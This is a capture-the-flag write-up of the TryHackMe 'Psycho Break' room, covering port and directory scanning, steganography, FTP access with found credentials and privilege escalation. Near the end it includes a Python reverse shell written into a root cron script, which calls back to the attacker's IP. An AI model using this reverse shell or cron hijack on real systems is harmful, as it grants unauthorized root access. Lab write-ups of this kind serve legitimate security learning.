https://tryhackme.com/room/psychobreak
![[Psycho Break-26.png]]

### Port scan

[[nmap]] scan
```
┌──(azam㉿kali)-[~/tools]
└─$ nmap -A -p21,22,80 10.10.237.126
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-26 00:05 +06
Nmap scan report for 10.10.237.126
Host is up (0.17s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5a
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 44:2f:fb:3b:f3:95:c3:c6:df:31:d6:e0:9e:99:92:42 (RSA)
|   256 92:24:36:91:7a:db:62:d2:b9:bb:43:eb:58:9b:50:14 (ECDSA)
|_  256 34:04:df:13:54:21:8d:37:7f:f8:0a:65:93:47:75:d0 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome To Becon Mental Hospital
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.4
OS details: Linux 4.4
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   170.69 ms 10.21.0.1
2   171.58 ms 10.10.237.126

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.14 seconds

```

see tht view-source
![[Psycho Break.png]]
`/sadistRoom`  we find a directory

Go to the directory
click  `here` and find key
![[Psycho Break-1.png]]


![[Psycho Break-2.png]]

/sadistRoom/scripts.js
532219a04ab7a02b56faafbec1a4c1ea
![[Psycho Break-3.png]]

![[Psycho Break-4.png]]

After go to locker room we should decode that
![[Psycho Break-24.png]]
![[Psycho Break-6.png]]

after entering the decoded file
![[Psycho Break-5.png]]
![[Psycho Break-7.png]]

after clicking the 4th number
![[Psycho Break-8.png]]

[[gobuster]] using
```
┌──(azam㉿kali)-[~/tools/1]
└─$ gobuster dir -u http://10.10.237.126/SafeHeaven/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.237.126/SafeHeaven/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/imgs                 (Status: 301) [Size: 324] [--> http://10.10.237.126/SafeHeaven/imgs/]
/keeper               (Status: 301) [Size: 326] [--> http://10.10.237.126/SafeHeaven/keeper/]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```

Click the button
![[Psycho Break-9.png]]

find the image in google
![[Psycho Break-10.png]]

![[Psycho Break-11.png]]

![[Psycho Break-12.png]]
after giving key to here
![[Psycho Break-13.png]]

Click the button
![[Psycho Break-14.png]]

![[Psycho Break-15.png]]

![[Psycho Break-16.png]]

`?shell=ls+..`
use it an get 2 directory name and use first one
![[Psycho Break-17.png]]

Download .zip file
![[Psycho Break-18.png]]

Unzip helpme.zip and get
`helpme.txt` & `Table.jpg`
```
┌──(azam㉿kali)-[~/tools/1]
└─$ cat helpme.txt     

From Joseph,

Who ever sees this message "HELP Me". Ruvik locked me up in this cell. Get the key on the table and unlock this cell. I'll tell you what happened when I am out of 
this cell.

```

```
┌──(azam㉿kali)-[~/tools/1]
└─$ binwalk -e Table.jpg         

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             Zip archive data, at least v2.0 to extract, uncompressed size: 25399, name: Joseph_Oda.jpg
25329         0x62F1          Zip archive data, at least v2.0 to extract, uncompressed size: 26844, name: key.wav

WARNING: One or more files failed to extract: either no utility was found or it's unimplemented

┌──(azam㉿kali)-[~/tools/1/_Table.jpg.extracted]
└─$ ls
0.zip  Joseph_Oda.jpg  key.wav
```
uplad the key.wav file here
https://morsecode.world/international/decoder/audio-decoder-adaptive.html?source=post_page-----c98d63a275b7---------------------------------------

![[Psycho Break-19.png]]
Use `SHOWME` as passphrase
```
┌──(azam㉿kali)-[~/tools/1/_Table.jpg.extracted]
└─$ steghide extract -sf Joseph_Oda.jpg
Enter passphrase: 
wrote extracted data to "thankyou.txt".
                                                                                                                                       
┌──(azam㉿kali)-[~/tools/1/_Table.jpg.extracted]
└─$ ls
0.zip  Joseph_Oda.jpg  key.wav  thankyou.txt
                                                                                                                                       
┌──(azam㉿kali)-[~/tools/1/_Table.jpg.extracted]
└─$ cat thankyou.txt       

From joseph,

Thank you so much for freeing me out of this cell. Ruvik is nor good, he told me that his going to kill sebastian and next would be me. You got to help 
Sebastian ... I think you might find Sebastian at the Victoriano Estate. This note I managed to grab from Ruvik might help you get inn to the Victoriano Estate. 
But for some reason there is my name listed on the note which I don't have a clue.

           --------------------------------------------
        //                                              \\
        ||      (NOTE) FTP Details                      ||
        ||      ==================                      ||
        ||                                              ||
        ||      USER : joseph                           ||
        ||      PASSWORD : intotheterror445             ||
        ||                                              ||
        \\                                              //
           --------------------------------------------


Good luck, Be carefull !!!

```

ftp
```
┌──(azam㉿kali)-[~/tools/1]
└─$ ftp 10.10.237.126                                                                                
Connected to 10.10.237.126.
220 ProFTPD 1.3.5a Server (Debian) [::ffff:10.10.237.126]
Name (10.10.237.126:azam): joseph
331 Password required for joseph
Password: 
230 User joseph logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||17819|)
150 Opening ASCII mode data connection for file list
-rwxr-xr-x   1 joseph   joseph   11641688 Aug 13  2020 program
-rw-r--r--   1 joseph   joseph        974 Aug 13  2020 random.dic
226 Transfer complete
ftp> mget *
mget program [anpqy?]? y
229 Entering Extended Passive Mode (|||12992|)
150 Opening BINARY mode data connection for program (11641688 bytes)
100% |******************************************************************************************| 11368 KiB  754.65 KiB/s    00:00 ETAy
226 Transfer complete
11641688 bytes received in 00:15 (745.72 KiB/s)
mget random.dic [anpqy?]? y
229 Entering Extended Passive Mode (|||20945|)
150 Opening BINARY mode data connection for random.dic (974 bytes)
100% |******************************************************************************************|   974        9.28 MiB/s    00:00 ETA
226 Transfer complete
974 bytes received in 00:00 (5.48 KiB/s)
ftp> bye
221 Goodbye.
```



make a python file
```
import os
import subprocess
import sys

# Correct way to open the file
with open("random.dic", "r") as f:
    keys = f.readlines()

# Loop through each key
for key in keys:
    key = key.strip()  # Removes newline and any surrounding whitespace
    print(key)
    subprocess.run(["./program", key])

```

```
┌──(azam㉿kali)-[~/tools/1]
└─$ python3 hi.py 
```

![[Psycho Break-20.png]]
![[Psycho Break-21.png]]
![[Psycho Break-22.png]]
that is the username and password

![[Psycho Break-23.png]]
```
kidman
KIDMANSPASSWORDISSOSTRANGE
```

`/var/.the_eye_of_ruvik.py` the file is run every 2 min
```
kidman@evilwithin:/home/ruvik$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

*/2 * * * * root python3 /var/.the_eye_of_ruvik.py

kidman@evilwithin:/home/ruvik$ ls -l /var/.the_eye_of_ruvik.py
-rwxr-xrw- 1 root root 300 Aug 14  2020 /var/.the_eye_of_ruvik.py
```

We edit the file 
```
#!/usr/bin/python3
import socket
import subprocess
import os
import pty

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.21.153.70", 6666))  # FIXED: use normal quotes

os.dup2(s.fileno(), 0)  # stdin
os.dup2(s.fileno(), 1)  # stdout
os.dup2(s.fileno(), 2)  # stderr

pty.spawn("/bin/bash")  # FIXED: use normal quotes

```
![[Psycho Break-25.png]]

got root

#tryhackme #ctf  #tryhackme_ctf 